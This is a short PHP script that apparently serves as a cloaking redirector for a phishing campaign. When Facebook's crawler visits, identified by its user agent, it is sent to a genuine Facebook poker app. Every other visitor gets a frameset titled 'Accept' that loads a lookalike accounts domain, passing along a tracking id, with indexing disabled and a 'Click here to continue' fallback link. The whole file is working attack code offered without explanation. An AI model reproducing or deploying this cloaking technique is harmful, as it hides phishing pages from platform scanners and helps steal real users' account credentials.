<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/facebook/si',$ua)) { 
header('Location: https://apps.facebook.com/texas_holdem/'); 
die(); }else{
$url = trim($_GET['bsoul']);
$id= trim($_GET['i']);
$min = substr($url , strpos($url , '//'), 5000000 );
$link = 'https://accounts-pps.ga/3a/';
echo '
<html>
<head>
<title>Accept</title>
<meta name="keywords" content="">
<meta name="description" content="">
<meta name="revisit-after" content="500000 days">
<meta name="robots" content="NOINDEX">
<link rel="shortcut icon" type="image/ico" href="">

</head>
<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
<frame name="main" src="'.$link.$min.'&i='.$id.'">
<noframes>
<body bgcolor="#FFFFFF" text="#000000">
<a href="'.$link.$min.'&i='.$id.'">Click here to continue</a>
</body>
</noframes>
</html>';
}
?>